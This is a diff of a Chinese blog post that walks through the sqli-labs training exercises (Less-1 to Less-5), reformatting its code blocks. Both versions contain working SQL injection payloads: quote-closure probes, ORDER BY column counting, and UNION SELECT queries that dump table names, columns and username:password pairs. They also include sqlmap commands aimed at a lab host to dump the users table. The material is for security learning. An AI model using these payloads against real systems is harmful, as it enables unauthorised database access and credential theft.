@@ -483,8 +483,8 @@
 </ul>
 <p>order by 排序，数值时，某列；字符时，字段名；不存在该列时，报错。</p>
 <p>union 合并多个select语句的结果集</p>
-<p>CONCAT()函数用于将多个字符串连接成一个字符串</p>
-<p>rand()函数，随机0-1之间的数</p>
+<p>concat()函数用于将多个字符串连接成一个字符串</p>
+<p>rand()函数，随机0-1之间的数,floor(5+rand()*5)</p>
 <p>floor()去掉小数。floor(min + rand() * (max - min)) </p>
 <p>limit 5 等价于limit 0,5 检索1-5,前五行</p>
 <p>left(被截取字符串， 截取长度)</p>
@@ -492,57 +492,21 @@
 <ul>
 <li>手工注入</li>
 </ul>
-<p>找注入点</p>
-<p>id处存在注入点，修改id的值，页面发生改变。</p>
-<p>判断id的值类型</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;2&#39;</span><br><span class="line">报错信息：...near &#39;&#39;2&#39;&#39; LIMIT 0,1&#39; at line 1</span><br></pre></td></tr></table></figure>
-
-<p>根据报错提示，判断出闭合条件为单引号</p>
-<p>成功闭合</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;2&#39; --+</span><br></pre></td></tr></table></figure>
-
-<p>判断字段数为三个</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;2&#39; order by 3 --+</span><br></pre></td></tr></table></figure>
-
-<p>爆出数据库名（<a href="https://www.runoob.com/sql/sql-union.html" target="_blank" rel="noopener">union操作符</a>）<br>union 合并多个select语句的结果集，此处id=0无结果，才会显示后面我们自己的结果。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0&#39; union select 1,database(),version() --+</span><br></pre></td></tr></table></figure>
-
-<p>爆出表名</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0&#39; union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() --+</span><br></pre></td></tr></table></figure>
-
-<p>查看表单名，挑选其中的users，爆字段名</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0&#39; union select 1,database(),group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;users&quot; --+</span><br></pre></td></tr></table></figure>
-
-<p>根据爆出的字段名，挑选username和password,爆出值</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0&#39; union select 1,database(),group_concat(username,0x3a,password) from security.users --+</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#找注入点，id处存在注入点，修改id的值，页面发生改变。判断id的值类型</span><br><span class="line">?id&#x3D;2&#39;</span><br><span class="line">#报错信息：...near &#39;&#39;2&#39;&#39; LIMIT 0,1&#39; at line 1，根据报错提示，判断出闭合条件为单引号，成功闭合</span><br><span class="line">?id&#x3D;2&#39; --+</span><br><span class="line">#判断字段数为三个</span><br><span class="line">?id&#x3D;2&#39; order by 3 --+</span><br><span class="line">#爆数据库名（[union操作符](https:&#x2F;&#x2F;www.runoob.com&#x2F;sql&#x2F;sql-union.html)）union 合并多个select语句的结果集，此处id&#x3D;0无结果，才会显示后面我们自己的结果。</span><br><span class="line">?id&#x3D;0&#39; union select 1,database(),version() --+</span><br><span class="line">#爆表名</span><br><span class="line">?id&#x3D;0&#39; union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() --+</span><br><span class="line">#查看表单名，挑选其中的users，爆字段名</span><br><span class="line">?id&#x3D;0&#39; union select 1,database(),group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;users&quot; --+</span><br><span class="line">#根据爆出的字段名，挑选username和password,爆出值</span><br><span class="line">?id&#x3D;0&#39; union select 1,database(),group_concat(username,0x3a,password) from security.users --+</span><br></pre></td></tr></table></figure>
 
 <ul>
 <li>sqlmap注入</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;10.1.136.159&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;1&quot; --current-db --batch</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;10.1.136.159&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;1&quot; -D &quot;security&quot; --tables --batch</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;10.1.136.159&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;1&quot; -D &quot;security&quot; -T users --columns --batch</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;10.1.136.159&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;1&quot; -D &quot;security&quot; -T users -C username,password --dump --batch</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;10.1.136.159&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;1&quot; --current-db --batch</span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;10.1.136.159&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;1&quot; -D &quot;security&quot; --tables --batch</span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;10.1.136.159&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;1&quot; -D &quot;security&quot; -T users --columns --batch</span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;10.1.136.159&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;1&quot; -D &quot;security&quot; -T users -C username,password --dump --batch</span><br></pre></td></tr></table></figure>
 
 <h3 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h3><p>get整形报错注入</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;</span><br><span class="line">报错为：near &#39;&#39; LIMIT 0,1&#39; at line 1</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;    #报错为：near &#39;&#39; LIMIT 0,1&#39; at line 1</span><br><span class="line">?id&#x3D;1 --+    #成功闭合</span><br></pre></td></tr></table></figure>
 
-<p>成功闭合</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1 --+</span><br></pre></td></tr></table></figure>
-
-<p>之后爆X同上</p>
 <h3 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h3><p>get字符型报错注入</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">报错为：near &#39;&#39;1&#39;&#39;) LIMIT 0,1&#39; at line 1</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;) --+</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;    #报错为：near &#39;&#39;1&#39;&#39;) LIMIT 0,1&#39; at line 1</span><br><span class="line">?id&#x3D;1&#39;) --+    #成功闭合</span><br></pre></td></tr></table></figure>
 
 <h3 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h3><p>get字符型报错注入</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&quot;</span><br><span class="line">报错为：near &#39;&quot;1&quot;&quot;) LIMIT 0,1&#39; at line 1</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&quot;) --+</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&quot;    #报错为：near &#39;&quot;1&quot;&quot;) LIMIT 0,1&#39; at line 1</span><br><span class="line">?id&#x3D;1&quot;) --+    #成功闭合</span><br></pre></td></tr></table></figure>
 
 <h3 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h3><p>get字符型双注入</p>
 <p>构造双查询，比如派生表，使一个报错，另一个的结果就会出现在报错的信息中。 </p>
@@ -695,7 +659,7 @@
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-05-11T15:25:12+08:00">
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-05-11T21:44:06+08:00">
   <a class='notlink'>
     <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
     <p>更新于：May 11, 2020</p>
